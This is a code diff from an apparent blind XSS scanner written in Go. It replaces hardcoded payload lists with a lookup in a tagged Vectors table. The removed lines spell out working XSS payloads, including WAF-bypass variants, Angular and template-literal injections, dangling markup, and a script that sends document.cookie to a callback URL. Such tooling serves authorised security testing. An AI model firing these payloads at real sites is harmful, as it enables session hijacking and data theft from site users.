@@ -45,66 +45,17 @@ func GenerateUniqueCallback(baseURL, identifier string) string {
 
 // BlindPayloads returns an expanded list of blind XSS payloads using the callback URL
 func BlindPayloads(callbackURL string) []string {
-	payloads := []string{
-		// Script injection
-		fmt.Sprintf("<script src=%s></script>", callbackURL),
-		fmt.Sprintf("<script>fetch('%s')</script>", callbackURL),
+	payloads := []string{}
 
-		// Image-based
-		fmt.Sprintf("<img src=%s>", callbackURL),
-		fmt.Sprintf("<img src=x onerror=fetch('%s')>", callbackURL),
-
-		// SVG
-		fmt.Sprintf("<svg onload=fetch('%s')>", callbackURL),
-
-		// Link prefetch (stealthy)
-		fmt.Sprintf("<link rel=prefetch href=%s>", callbackURL),
-
-		// JavaScript URL
-		fmt.Sprintf("javascript:fetch('%s')", callbackURL),
-
-		// DOM-based
-		fmt.Sprintf("<iframe src=%s>", callbackURL),
-
-		// XHR
-		fmt.Sprintf("<script>new Image().src='%s'</script>", callbackURL),
-
-		// Object/Embed
-		fmt.Sprintf("<object data=%s>", callbackURL),
-
-		// Video/Audio
-		fmt.Sprintf("<video src=%s onerror=fetch('%s')>", callbackURL, callbackURL),
-
-		// Meta refresh
-		fmt.Sprintf("<meta http-equiv=refresh content='0;url=%s'>", callbackURL),
-
-		// === Modern WAF Bypass & Obfuscation ===
-
-		// Details Toggle (Chrome/Webkit)
-		fmt.Sprintf("<details ontoggle=fetch('%s')>open", callbackURL),
-
-		// Isindex (Old but sometimes works)
-		fmt.Sprintf("<isindex formaction=%s>", callbackURL),
-
-		// Obfuscated JavaScript URL (Newlines)
-		fmt.Sprintf("j%%0Aavas%%0Dcript:fetch('%s')", callbackURL),
-
-		// SVG with multiple event handlers
-		fmt.Sprintf("<svg><animate onbegin=fetch('%s') attributeName=x dur=1s>", callbackURL),
-
-		// Body onload (if injected in head)
-		fmt.Sprintf("<body onload=fetch('%s')>", callbackURL),
-
-		// Iframe srcdoc
-		fmt.Sprintf("<iframe srcdoc=\"<img src=x onerror=fetch('%s')>\"></iframe>", callbackURL),
-
-		// === Data Exfiltration (Base64 encoded domain/cookies) ===
-		// Note: We append a random param to avoid caching
-		fmt.Sprintf("<script>fetch('%s?d='+btoa(document.domain)+'&c='+btoa(document.cookie))</script>", callbackURL),
-		fmt.Sprintf("<img src=x onerror=this.src='%s?d='+btoa(document.domain)>", callbackURL),
-
-		// Dangling Markup (Unclosed) - Exfiltrates subsequent HTML
-		fmt.Sprintf("<img src='%s?", callbackURL),
+	// Iterate over vectors to find blind payloads
+	for _, v := range Vectors {
+		// Match Tags (must be blind)
+		if hasTag(v.Tags, "blind") {
+			// Replace Placeholder
+			// Note: Time-based payloads might not have {{CALLBACK}}, which is fine
+			payload := strings.ReplaceAll(v.Content, "{{CALLBACK}}", callbackURL)
+			payloads = append(payloads, payload)
+		}
 	}
 
 	// Append Polyglots
@@ -115,68 +66,31 @@ func BlindPayloads(callbackURL string) []string {
 
 // BlindPayloadsForContext returns context-specific blind XSS payloads
 func BlindPayloadsForContext(callbackURL string, context models.ReflectionContext) []string {
-	switch context {
-	case models.ContextHTML:
-		return []string{
-			fmt.Sprintf("<script src=%s></script>", callbackURL),
-			fmt.Sprintf("<img src=x onerror=fetch('%s')>", callbackURL),
-			fmt.Sprintf("<svg onload=fetch('%s')>", callbackURL),
-			fmt.Sprintf("<iframe src=%s>", callbackURL),
-			fmt.Sprintf("<link rel=prefetch href=%s>", callbackURL),
-			fmt.Sprintf("<object data=%s>", callbackURL),
+	var payloads []string
+
+	// Iterate over vectors to find matches
+	for _, v := range Vectors {
+		// 1. Match Context
+		if v.Context != context {
+			continue
 		}
 
-	case models.ContextJavaScript, models.ContextJSSingleQuote, models.ContextJSDoubleQuote, models.ContextJSRaw:
-		payloads := []string{
-			fmt.Sprintf(";fetch('%s');//", callbackURL),
-			fmt.Sprintf("</script><script>fetch('%s')</script>", callbackURL),
-		}
-		// Add context-specific escapes
-		if context == models.ContextJSSingleQuote {
-			payloads = append(payloads, fmt.Sprintf("';fetch('%s');//", callbackURL))
-		} else if context == models.ContextJSDoubleQuote {
-			payloads = append(payloads, fmt.Sprintf("\";fetch('%s');//", callbackURL))
-		}
-		return payloads
-
-	case models.ContextAttribute:
-		return []string{
-			fmt.Sprintf("\" onload=fetch('%s') x=\"", callbackURL),
-			fmt.Sprintf("' onload=fetch('%s') x='", callbackURL),
-			fmt.Sprintf("\"><img src=x onerror=fetch('%s')>", callbackURL),
-			fmt.Sprintf("'><img src=x onerror=fetch('%s')>", callbackURL),
+		// 2. Match Tags (must be blind)
+		if !hasTag(v.Tags, "blind") {
+			continue
 		}
 
-	case models.ContextURL:
-		return []string{
-			fmt.Sprintf("javascript:fetch('%s')", callbackURL),
-			fmt.Sprintf("\"><script>fetch('%s')</script>", callbackURL),
-			fmt.Sprintf("'><script>fetch('%s')</script>", callbackURL),
-		}
+		// 3. Replace Placeholder
+		payload := strings.ReplaceAll(v.Content, "{{CALLBACK}}", callbackURL)
+		payloads = append(payloads, payload)
+	}
 
-	case models.ContextAngular:
-		return []string{
-			fmt.Sprintf("{{constructor.constructor('fetch(\"%s\")')()}}", callbackURL),
-			fmt.Sprintf("{{$on.constructor('fetch(\"%s\")')()}}", callbackURL),
-			fmt.Sprintf("{{[].pop.constructor('fetch(\"%s\")')()}}", callbackURL),
-		}
-
-	case models.ContextTemplateLiteral:
-		return []string{
-			fmt.Sprintf("${fetch('%s')}", callbackURL),
-			fmt.Sprintf("`+fetch('%s')+`", callbackURL),
-		}
-
-	case models.ContextSVG:
-		return []string{
-			fmt.Sprintf("<svg onload=fetch('%s')>", callbackURL),
-			fmt.Sprintf("\"><svg onload=fetch('%s')>", callbackURL),
-		}
-
-	default:
-		// Fallback to generic payloads for unknown contexts
+	// If no specific payloads found, fallback to generic ones (or if context is HTML/Unknown)
+	if len(payloads) == 0 {
 		return BlindPayloads(callbackURL)
 	}
+
+	return payloads
 }
 
 // InjectBlind performs a fire-and-forget injection of blind XSS payloads
